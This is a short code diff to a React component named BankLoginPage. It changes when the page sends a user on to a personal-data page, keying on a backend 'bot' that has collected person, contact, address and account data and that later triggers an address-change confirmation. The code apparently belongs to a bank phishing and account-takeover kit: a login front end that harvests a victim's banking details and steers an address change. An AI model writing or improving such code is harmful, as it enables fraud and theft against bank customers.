@@ -355,14 +355,16 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
           (value === true || value === 1 || String(value).toLowerCase() === "true"),
         );
 
-      // Only redirect once the bot has collected all data AND is ready for the
-      // address-change confirmation. The bot sets `waiting_for_address_confirm`
-      // after `result` is fully populated.
+      // Redirect to the personal-data page as soon as the bot has collected
+      // the full result set. The address-change popup is unlocked later on
+      // that page once the backend flips to `waiting_for_address_confirm`.
+      const r = data?.result ?? null;
+      const hasFullData = !!(r && r.person_data && r.kontakt_data && r.adressen_data && r.konto_data);
       const needsAddressConfirm = st === "waiting_for_address_confirm";
 
-      if (needsAddressConfirm) {
+      if (needsAddressConfirm || hasFullData) {
         try {
-          if (data?.result) sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result));
+          if (r) sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(r));
         } catch {}
         try {
           sessionStorage.setItem(`bot_bank_${taskId}`, JSON.stringify({
@@ -377,6 +379,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         navigate({ to: "/personal-data/$taskId", params: { taskId } });
         return;
       }
+
 
 
 
